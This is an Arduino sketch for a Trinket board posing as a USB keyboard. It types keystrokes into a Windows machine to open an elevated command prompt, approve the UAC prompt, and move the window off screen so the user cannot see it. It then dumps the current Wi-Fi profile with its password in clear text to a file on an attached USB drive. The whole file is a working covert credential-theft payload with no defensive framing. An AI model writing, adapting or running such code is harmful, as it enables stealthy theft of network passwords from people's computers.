#include <cmdline_defs.h>
#include <TrinketKeyboard.h>
#include <TrinketKeyboardC.h>
#include <usbconfig.h>

void setup() {
    TrinketKeyboard.begin();
}

/* This is a function to make pressing the enter key easier */
void pressEnter() {
  TrinketKeyboard.pressKey(0, 0x28);
  delay(5);
  TrinketKeyboard.pressKey(0,0);
}
/* This function creates a prompt with Admin privs and bypasses User Account Controls */
void bypass_UAC() {
  TrinketKeyboard.pressKey(0x08, 0x15);  /* GUI+r Key */
  delay(40);
  TrinketKeyboard.pressKey(0, 0); /* Key Release */
  delay(100);
  TrinketKeyboard.pressKey(0x08, 0x15);  /* GUI+r Key again just to be sure we start off on the right foot*/
  delay(40);
  TrinketKeyboard.pressKey(0, 0); /* Key Release */
  delay(200);
  TrinketKeyboard.print("powershell Start-Process cmd -Verb runAs");
  delay(10);
  pressEnter();
  delay(2500);
  TrinketKeyboard.pressKey(0xE6, 0x1C);  /* ALT+y Key */
  delay(5);
  TrinketKeyboard.pressKey(0, 0); /* Key Release */
}

/* This function moves the current window off the screen so user can not see it */
void hide() {
  TrinketKeyboard.pressKey(0xE6, 0x2C);  /* ALT+Spacebar Key */
  delay(30);
  TrinketKeyboard.pressKey(0, 0); /* Key Release */
  delay(10);
  TrinketKeyboard.pressKey(0, 0x10);  /* m Key */
  delay(30);
  TrinketKeyboard.pressKey(0, 0); /* Key Release */
  delay(10);
  TrinketKeyboard.pressKey(0, 0x50);  /* Arrow_Left Key */
  delay(6000); 
  TrinketKeyboard.pressKey(0, 0); /* Key Release */
  delay(10);
  pressEnter();
  delay(10);
}

/* This function is for the main code */
void loop() {
  delay(2000);
  bypass_UAC();
  delay(500);
  TrinketKeyboard.print("mode con cols=15 lines=1"); /* Shrinking the prompt before moving it */
  delay(10);
  pressEnter();
  hide();
  TrinketKeyboard.print("cd %USERPROFILE%\Documents"); /* Changing directories because system32 appears to be protectedt */
  delay(5);
  pressEnter();
  delay(10);
  TrinketKeyboard.print("for /f \"tokens=3 delims= \" %D in ('echo list volume ^| diskpart ^| findstr SERVICE') do (set DRIVE=%D)"); /* Finding the drive letter to storage device named SERVICE */
  delay(10);
  pressEnter();
  delay(100);
  TrinketKeyboard.print("%DRIVE%:"); /* Switch drives to storage device */
  delay(10);
  pressEnter();
  delay(100);
  TrinketKeyboard.print("for /f \"tokens=2 delims=: \" %I in ('netsh wlan show interface ^| findstr SSID ^| findstr /v BSSID') do set I=%I"); /* Finding WLAN interface name */
  delay(10);
  pressEnter();
  delay(100); 
  TrinketKeyboard.print("netsh wlan show profile %I% key=clear >> wlanData.txt"); /* Send wlan password and data to text file on storage device */
  delay(10);
  pressEnter();
  delay(100);
  TrinketKeyboard.print("exit");
  delay(10);
  pressEnter();
  delay(100);
  exit(0);
}
